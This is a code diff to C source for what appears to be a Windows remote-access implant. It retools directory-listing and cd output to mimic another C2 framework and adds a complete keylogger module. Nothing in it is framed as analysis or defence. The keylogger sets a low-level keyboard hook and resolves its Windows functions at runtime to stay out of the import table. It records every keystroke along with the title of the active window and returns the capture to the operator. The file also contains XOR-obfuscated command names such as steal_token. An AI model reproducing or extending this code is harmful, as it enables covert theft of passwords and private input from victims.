@@ -36,6 +36,7 @@ static const unsigned char _mn_powershell[]  = {'p'^_K,'o'^_K,'w'^_K,'e'^_K,'r'^
 static const unsigned char _mn_steal_token[] = {'s'^_K,'t'^_K,'e'^_K,'a'^_K,'l'^_K,'_'^_K,'t'^_K,'o'^_K,'k'^_K,'e'^_K,'n'^_K};
 static const unsigned char _mn_rev2self[]    = {'r'^_K,'e'^_K,'v'^_K,'2'^_K,'s'^_K,'e'^_K,'l'^_K,'f'^_K};
 static const unsigned char _mn_systeminfo[]  = {'s'^_K,'y'^_K,'s'^_K,'t'^_K,'e'^_K,'m'^_K,'i'^_K,'n'^_K,'f'^_K,'o'^_K};
+static const unsigned char _mn_keylogger[]   = {'k'^_K,'e'^_K,'y'^_K,'l'^_K,'o'^_K,'g'^_K,'g'^_K,'e'^_K,'r'^_K};
 #undef _K
 
 /* ─── Argument parsing helpers (BeaconDataParse-compatible) ─── */
@@ -518,43 +519,71 @@ void mod_ps(Buffer *out) {
 
 void mod_ls(Buffer *out, const char *path) {
     char search[MAX_PATH];
+    char abs_dir[MAX_PATH];
     char line[1024];
 
-    if (!path || strlen(path) == 0)
-        GetCurrentDirectoryA(MAX_PATH, search);
-    else
-        strncpy(search, path, MAX_PATH - 3);
+    if (!path || strlen(path) == 0) {
+        GetCurrentDirectoryA(MAX_PATH, abs_dir);
+    } else {
+        /* Resolve to absolute path */
+        if (!GetFullPathNameA(path, MAX_PATH, abs_dir, NULL)) {
+            strncpy(abs_dir, path, MAX_PATH - 1);
+            abs_dir[MAX_PATH - 1] = '\0';
+        }
+    }
 
-    /* Append \* for FindFirstFile */
+    /* Build search pattern: abs_dir\* */
+    strncpy(search, abs_dir, MAX_PATH - 3);
+    search[MAX_PATH - 3] = '\0';
     size_t slen = strlen(search);
-    if (search[slen - 1] != '\\') strcat(search, "\\");
+    if (slen > 0 && search[slen - 1] != '\\') strcat(search, "\\");
     strcat(search, "*");
 
     WIN32_FIND_DATAA fd;
     HANDLE hFind = FindFirstFileA(search, &fd);
     if (hFind == INVALID_HANDLE_VALUE) {
-        snprintf(line, sizeof(line), "Error listing: %s (err=%lu)\n", path, GetLastError());
+        snprintf(line, sizeof(line), "Error listing: %s (err=%lu)\n",
+                 abs_dir, GetLastError());
         buf_append(out, line, (DWORD)strlen(line));
         return;
     }
 
-    snprintf(line, sizeof(line), "%-5s %-20s %-12s %s\n", "TYPE", "MODIFIED", "SIZE", "NAME");
+    /* Header — Merlin format */
+    snprintf(line, sizeof(line), "Directory listing for: %s\r\n\r\n", abs_dir);
     buf_append(out, line, (DWORD)strlen(line));
-    buf_append(out, "───── ──────────────────── ──────────── ────────────────────\n", 60);
 
     do {
-        const char *type = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "DIR" : "FILE";
+        /* ── Permissions string (Unix-style from Windows attrs) ── */
+        int is_dir  = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
+        int is_ro   = (fd.dwFileAttributes & FILE_ATTRIBUTE_READONLY)  != 0;
+        char perms[11];
+        /*  d rwx rwx rwx  or  - rw- rw- rw-  (Go's os.FileMode on Windows) */
+        perms[0] = is_dir ? 'd' : '-';
+        perms[1] = 'r';
+        perms[2] = is_ro  ? '-' : 'w';
+        perms[3] = is_dir ? 'x' : '-';
+        perms[4] = 'r';
+        perms[5] = is_ro  ? '-' : 'w';
+        perms[6] = is_dir ? 'x' : '-';
+        perms[7] = 'r';
+        perms[8] = is_ro  ? '-' : 'w';
+        perms[9] = is_dir ? 'x' : '-';
+        perms[10] = '\0';
 
+        /* ── Modified time ── */
         SYSTEMTIME st;
         FileTimeToSystemTime(&fd.ftLastWriteTime, &st);
         char timestr[32];
-        snprintf(timestr, sizeof(timestr), "%04d-%02d-%02d %02d:%02d",
-                 st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute);
+        snprintf(timestr, sizeof(timestr), "%04d-%02d-%02d %02d:%02d:%02d",
+                 st.wYear, st.wMonth, st.wDay,
+                 st.wHour, st.wMinute, st.wSecond);
 
+        /* ── Size ── */
         ULONGLONG fsize = ((ULONGLONG)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
 
-        snprintf(line, sizeof(line), "%-5s %-20s %-12llu %s\n",
-                 type, timestr, fsize, fd.cFileName);
+        /* ── Output: perms \t modified \t size \t name ── */
+        snprintf(line, sizeof(line), "%s\t%s\t%llu\t%s\n",
+                 perms, timestr, fsize, fd.cFileName);
         buf_append(out, line, (DWORD)strlen(line));
     } while (FindNextFileA(hFind, &fd));
 
@@ -565,24 +594,30 @@ void mod_ls(Buffer *out, const char *path) {
 
 void mod_cd(Buffer *out, const char *path) {
     if (!path || strlen(path) == 0) {
-        /* No argument — print current directory */
+        /* No argument — print current working directory (like pwd) */
         char cwd[MAX_PATH];
         GetCurrentDirectoryA(MAX_PATH, cwd);
-        buf_append(out, cwd, (DWORD)strlen(cwd));
+        char line[MAX_PATH + 32];
+        snprintf(line, sizeof(line), "Current working directory: %s", cwd);
+        buf_append(out, line, (DWORD)strlen(line));
         return;
     }
 
     if (!SetCurrentDirectoryA(path)) {
         char err[512];
-        snprintf(err, sizeof(err), "cd: cannot access '%s' (err=%lu)\n", path, GetLastError());
+        snprintf(err, sizeof(err),
+                 "there was an error changing directories when executing the 'cd' command:\r\n"
+                 "SetCurrentDirectoryA failed for '%s' (err=%lu)", path, GetLastError());
         buf_append(out, err, (DWORD)strlen(err));
         return;
     }
 
-    /* Return new CWD so operator can update prompt */
+    /* Return Merlin-style confirmation + new absolute CWD */
     char cwd[MAX_PATH];
     GetCurrentDirectoryA(MAX_PATH, cwd);
-    buf_append(out, cwd, (DWORD)strlen(cwd));
+    char line[MAX_PATH + 48];
+    snprintf(line, sizeof(line), "Changed working directory to %s", cwd);
+    buf_append(out, line, (DWORD)strlen(line));
 }
 
 /* ─── Module: cat (read file) ─── */
@@ -611,6 +646,236 @@ void mod_cat(Buffer *out, const char *path) {
     }
     free(fbuf);
     CloseHandle(hFile);
+}
+
+/* ─── Module: keylogger (in-memory keystroke capture) ─── */
+
+/* Persistent state — survives across task invocations */
+static HHOOK            _kl_hook       = NULL;
+static HANDLE           _kl_thread     = NULL;
+static DWORD            _kl_thread_id  = 0;
+static Buffer           _kl_buf        = {NULL, 0, 0};
+static volatile LONG    _kl_active     = 0;
+static char             _kl_last_wnd[256] = {0};
+static CRITICAL_SECTION _kl_cs;
+static int              _kl_cs_init    = 0;
+
+/* Dynamically resolved user32 pointers (set once on start) */
+typedef HHOOK   (WINAPI *_kl_fn_SetHook)(int, HOOKPROC, HINSTANCE, DWORD);
+typedef BOOL    (WINAPI *_kl_fn_Unhook)(HHOOK);
+typedef LRESULT (WINAPI *_kl_fn_CallNext)(HHOOK, int, WPARAM, LPARAM);
+typedef BOOL    (WINAPI *_kl_fn_GetMsg)(LPMSG, HWND, UINT, UINT);
+typedef HWND    (WINAPI *_kl_fn_GetFgWnd)(void);
+typedef int     (WINAPI *_kl_fn_GetWndTxt)(HWND, LPSTR, int);
+typedef SHORT   (WINAPI *_kl_fn_GetKeyState)(int);
+typedef BOOL    (WINAPI *_kl_fn_PostThrdMsg)(DWORD, UINT, WPARAM, LPARAM);
+typedef HMODULE (WINAPI *_kl_fn_GetModHandle)(LPCSTR);
+
+static _kl_fn_CallNext    _klCallNext   = NULL;
+static _kl_fn_GetFgWnd    _klGetFgWnd   = NULL;
+static _kl_fn_GetWndTxt   _klGetWndTxt  = NULL;
+static _kl_fn_GetKeyState _klGetKS      = NULL;
+
+/* Hook callback — runs in the hook thread context */
+static LRESULT CALLBACK _kl_hook_proc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode >= 0 && (wParam == 0x0100 /*WM_KEYDOWN*/ || wParam == 0x0104 /*WM_SYSKEYDOWN*/)) {
+        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lParam;
+        DWORD vk = kb->vkCode;
+
+        /* Foreground window title */
+        char wt[256] = {0};
+        HWND fg = _klGetFgWnd();
+        if (fg) _klGetWndTxt(fg, wt, sizeof(wt));
+
+        EnterCriticalSection(&_kl_cs);
+
+        /* Window changed — emit header */
+        if (strcmp(wt, _kl_last_wnd) != 0) {
+            strncpy(_kl_last_wnd, wt, sizeof(_kl_last_wnd) - 1);
+            char hdr[320];
+            snprintf(hdr, sizeof(hdr), "\r\n[%s]\r\n", wt[0] ? wt : "(untitled)");
+            buf_append(&_kl_buf, hdr, (DWORD)strlen(hdr));
+        }
+
+        int shift = (_klGetKS(0x10) & 0x8000) != 0;   /* VK_SHIFT   */
+        int caps  = (_klGetKS(0x14) & 0x0001) != 0;    /* VK_CAPITAL */
+        char out[16] = {0};
+
+        if (vk >= 0x41 && vk <= 0x5A) {                /* A-Z */
+            out[0] = (shift ^ caps) ? (char)vk : (char)(vk + 32);
+        } else if (vk >= 0x30 && vk <= 0x39) {         /* 0-9 */
+            if (shift) { const char *s = ")!@#$%^&*("; out[0] = s[vk - 0x30]; }
+            else out[0] = (char)vk;
+        } else if (vk >= 0x60 && vk <= 0x69) {         /* Numpad 0-9 */
+            out[0] = (char)('0' + (vk - 0x60));
+        } else {
+            switch (vk) {
+                case 0x0D: strncpy(out, "\r\n", 3); break;
+                case 0x20: out[0] = ' '; break;
+                case 0x09: strncpy(out, "[TAB]", 6); break;
+                case 0x08: strncpy(out, "[BS]", 5); break;
+                case 0x1B: strncpy(out, "[ESC]", 6); break;
+                case 0x2E: strncpy(out, "[DEL]", 6); break;
+                case 0xBA: out[0] = shift ? ':' : ';'; break;
+                case 0xBB: out[0] = shift ? '+' : '='; break;
+                case 0xBC: out[0] = shift ? '<' : ','; break;
+                case 0xBD: out[0] = shift ? '_' : '-'; break;
+                case 0xBE: out[0] = shift ? '>' : '.'; break;
+                case 0xBF: out[0] = shift ? '?' : '/'; break;
+                case 0xC0: out[0] = shift ? '~' : '`'; break;
+                case 0xDB: out[0] = shift ? '{' : '['; break;
+                case 0xDC: out[0] = shift ? '|' : '\\'; break;
+                case 0xDD: out[0] = shift ? '}' : ']'; break;
+                case 0xDE: out[0] = shift ? '"' : '\''; break;
+                case 0x6A: out[0] = '*'; break;
+                case 0x6B: out[0] = '+'; break;
+                case 0x6D: out[0] = '-'; break;
+                case 0x6E: out[0] = '.'; break;
+                case 0x6F: out[0] = '/'; break;
+                /* Modifiers — skip */
+                case 0x10: case 0x11: case 0x12:
+                case 0xA0: case 0xA1: case 0xA2: case 0xA3:
+                case 0x5B: case 0x5C:
+                    break;
+                default:
+                    if (vk >= 0x70 && vk <= 0x7B)
+                        snprintf(out, sizeof(out), "[F%d]", vk - 0x6F);
+                    break;
+            }
+        }
+
+        if (out[0])
+            buf_append(&_kl_buf, out, (DWORD)strlen(out));
+
+        LeaveCriticalSection(&_kl_cs);
+    }
+    return _klCallNext(_kl_hook, nCode, wParam, lParam);
+}
+
+/* Hook thread — installs hook + runs message pump */
+static DWORD WINAPI _kl_thread_func(LPVOID param) {
+    _kl_fn_SetHook fnSetHook = (_kl_fn_SetHook)param;
+
+    /* Resolve GetModuleHandleA for hMod (not an IAT import) */
+    HMODULE hK32 = LoadLibraryA("kernel32.dll");
+    _kl_fn_GetModHandle fnGMH = (_kl_fn_GetModHandle)GetProcAddress(hK32, "GetModuleHandleA");
+    HMODULE hSelf = fnGMH ? fnGMH(NULL) : NULL;
+
+    _kl_hook = fnSetHook(13 /*WH_KEYBOARD_LL*/, _kl_hook_proc, hSelf, 0);
+    if (!_kl_hook) {
+        InterlockedExchange(&_kl_active, 0);
+        return 1;
+    }
+
+    /* Message pump — required for low-level hooks */
+    HMODULE hU32 = LoadLibraryA("user32.dll");
+    _kl_fn_GetMsg fnGetMsg = (_kl_fn_GetMsg)GetProcAddress(hU32, "GetMessageA");
+
+    MSG msg;
+    while (fnGetMsg(&msg, NULL, 0, 0) > 0) {
+        /* WM_QUIT → GetMessage returns 0 → loop exits */
+    }
+
+    _kl_fn_Unhook fnUnhook = (_kl_fn_Unhook)GetProcAddress(hU32, "UnhookWindowsHookEx");
+    if (fnUnhook && _kl_hook) { fnUnhook(_kl_hook); _kl_hook = NULL; }
+
+    return 0;
+}
+
+void mod_keylogger(Buffer *out, const char *subcmd) {
+    if (!subcmd || !*subcmd) {
+        buf_append(out, "Usage: keylogger start|stop", 27);
+        return;
+    }
+
+    if (strcmp(subcmd, "start") == 0) {
+        if (InterlockedCompareExchange(&_kl_active, 1, 0) == 1) {
+            buf_append(out, "Keylogger already running", 25);
+            return;
+        }
+
+        /* Init critical section once */
+        if (!_kl_cs_init) { InitializeCriticalSection(&_kl_cs); _kl_cs_init = 1; }
+
+        /* Clear previous capture */
+        EnterCriticalSection(&_kl_cs);
+        if (_kl_buf.data) { free(_kl_buf.data); _kl_buf.data = NULL; }
+        _kl_buf.len = 0; _kl_buf.cap = 0;
+        _kl_last_wnd[0] = '\0';
+        LeaveCriticalSection(&_kl_cs);
+
+        /* Resolve user32 functions */
+        HMODULE hU32 = LoadLibraryA("user32.dll");
+        if (!hU32) {
+            InterlockedExchange(&_kl_active, 0);
+            buf_append(out, "Failed to load user32.dll", 25);
+            return;
+        }
+
+        _kl_fn_SetHook fnSetHook = (_kl_fn_SetHook)GetProcAddress(hU32, "SetWindowsHookExA");
+        _klCallNext  = (_kl_fn_CallNext)   GetProcAddress(hU32, "CallNextHookEx");
+        _klGetFgWnd  = (_kl_fn_GetFgWnd)   GetProcAddress(hU32, "GetForegroundWindow");
+        _klGetWndTxt = (_kl_fn_GetWndTxt)  GetProcAddress(hU32, "GetWindowTextA");
+        _klGetKS     = (_kl_fn_GetKeyState) GetProcAddress(hU32, "GetKeyState");
+
+        if (!fnSetHook || !_klCallNext || !_klGetFgWnd || !_klGetWndTxt || !_klGetKS) {
+            InterlockedExchange(&_kl_active, 0);
+            buf_append(out, "Failed to resolve user32 functions", 34);
+            return;
+        }
+
+        /* Launch hook thread — pass fnSetHook as param */
+        _kl_thread = CreateThread(NULL, 0, _kl_thread_func,
+                                  (LPVOID)fnSetHook, 0, &_kl_thread_id);
+        if (!_kl_thread) {
+            InterlockedExchange(&_kl_active, 0);
+            buf_append(out, "Failed to create keylogger thread", 33);
+            return;
+        }
+
+        Sleep(100); /* Let hook install */
+        if (!_kl_active) {
+            buf_append(out, "Hook installation failed", 24);
+            return;
+        }
+
+        buf_append(out, "Keylogger started", 17);
+    }
+    else if (strcmp(subcmd, "stop") == 0) {
+        if (InterlockedCompareExchange(&_kl_active, 0, 1) == 0) {
+            buf_append(out, "Keylogger not running", 21);
+            return;
+        }
+
+        /* Signal hook thread to exit via WM_QUIT */
+        HMODULE hU32 = LoadLibraryA("user32.dll");
+        _kl_fn_PostThrdMsg fnPost = (_kl_fn_PostThrdMsg)GetProcAddress(hU32, "PostThreadMessageA");
+        if (fnPost && _kl_thread_id)
+            fnPost(_kl_thread_id, 0x0012 /*WM_QUIT*/, 0, 0);
+
+        if (_kl_thread) {
+            WaitForSingleObject(_kl_thread, 3000);
+            CloseHandle(_kl_thread);
+            _kl_thread = NULL;
+            _kl_thread_id = 0;
+        }
+
+        /* Return captured keystrokes */
+        EnterCriticalSection(&_kl_cs);
+        if (_kl_buf.data && _kl_buf.len > 0) {
+            const char *hdr = "Keylogger stopped — captured keystrokes:\r\n";
+            buf_append(out, hdr, (DWORD)strlen(hdr));
+            buf_append(out, _kl_buf.data, _kl_buf.len);
+        } else {
+            buf_append(out, "Keylogger stopped — no keystrokes captured", 43);
+        }
+        free(_kl_buf.data); _kl_buf.data = NULL;
+        _kl_buf.len = 0; _kl_buf.cap = 0;
+        LeaveCriticalSection(&_kl_cs);
+    }
+    else {
+        buf_append(out, "Usage: keylogger start|stop", 27);
+    }
 }
 
 /* ─── Module: upload (write file to target) ─── */
@@ -1148,6 +1413,16 @@ BOOL module_execute(const char *name, const unsigned char *args, DWORD args_len,
         }
         mod_cat(&out, path_str);
         if (path_str) free(path_str);
+    }
+    else if (_mod_eq(name, _mn_keylogger, sizeof(_mn_keylogger))) {
+        char *sub = NULL;
+        if (args && args_len > 0) {
+            sub = (char *)malloc(args_len + 1);
+            memcpy(sub, args, args_len);
+            sub[args_len] = '\0';
+        }
+        mod_keylogger(&out, sub);
+        if (sub) free(sub);
     }
     else if (_mod_eq(name, _mn_upload, sizeof(_mn_upload))) {
         const char *path = arg_extract_str(&ap);
